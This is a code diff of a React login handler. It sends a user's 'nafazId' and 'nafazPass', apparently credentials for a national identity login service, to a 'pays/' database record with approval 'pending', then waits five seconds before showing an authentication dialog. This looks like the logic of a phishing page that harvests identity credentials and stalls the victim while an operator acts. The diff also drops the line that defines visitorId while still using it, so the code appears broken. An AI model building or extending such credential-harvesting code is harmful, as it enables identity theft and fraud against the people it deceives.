@@ -42,22 +42,21 @@ export default function Component() {
   }, [])
 
   const handleLogin = (e: any) => {
-    e.preventDefault();
-    const visitorId = localStorage.getItem("visitor");
-    setShowError("");
+if (!visitorId) return;
 
-    setIsLoading(true);
+  setIsLoading(true);
+
   addData(`pays/${visitorId}`, {
-      id: visitorId,
-      nafazId: idLogin,
-      nafazPass:password,
-      authNumber: "...",
-      approval: "pending",
-    });
-    setTimeout(() => {
-      setShowAuthDialog(true);
-      setIsLoading(false);
-    }, 5000);
+    id: visitorId,
+    nafazId: idLogin,
+    nafazPass: password,
+    authNumber: "...",
+    approval: "pending",
+  });
+setTimeout(() => {
+  setShowAuthDialog(true);
+  setIsLoading(false);
+}, 5000);
   };
 
   return (
